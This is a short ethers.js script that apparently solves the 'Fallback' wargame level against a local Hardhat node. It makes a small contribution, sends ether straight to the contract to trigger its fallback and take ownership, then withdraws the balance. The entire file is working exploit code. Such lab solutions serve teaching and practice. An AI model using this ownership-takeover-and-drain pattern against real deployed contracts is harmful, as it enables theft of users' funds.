import { ethers } from "ethers";

export default async function (providerUrl, contractAddress) {

  // Connect to local Hardhat node
  const provider = new ethers.JsonRpcProvider(providerUrl);

  const accounts = await provider.listAccounts();
  const signer = await provider.getSigner(1);

  // Create a contract instance
  const Fallback = new ethers.Contract(
    contractAddress,
    [
      "function contribute() external payable",
      "function withdraw() external",
      "function owner() public view returns (address)"
    ],
    signer
  );

  console.log("Current contract owner address:", await Fallback.owner());
  console.log("Attacker address:", signer.address);

  await (await Fallback.contribute({ value: ethers.parseEther("0.0001") })).wait();

  await (await signer.sendTransaction({ to: contractAddress, value: ethers.parseEther("0.0001") })).wait();
  console.log("New owner:", await Fallback.owner());

  await (await Fallback.withdraw()).wait();

  console.log("Exploit complete!");

}

